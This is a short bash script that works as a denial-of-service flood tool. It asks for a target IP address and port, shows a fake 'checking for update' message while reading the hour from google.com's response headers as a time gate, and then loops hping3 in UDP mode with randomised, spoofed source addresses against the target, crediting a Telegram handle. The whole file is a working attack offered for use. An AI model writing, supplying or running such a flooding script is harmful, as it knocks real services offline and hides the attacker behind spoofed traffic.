echo whats your ip?

read i
echo whats your port?
read p
echo "checking for update"
sleep 1
ii=$(wget -qSO- --max-redirect=0 google.com 2>&1 | grep Date: | cut -d' ' -f5-8|cut -b 1-2);pp=19;if [ $pp -gt $ii ] 
then 
echo attack started on $i =ip $p =port  by t.me/mr_spidder
while true 
do
hping3 -2 --faster  -c 200  --rand-source $i -p $p
sleep 1
clear
done
else
echo server not found contact t.me/mr_spidder
fi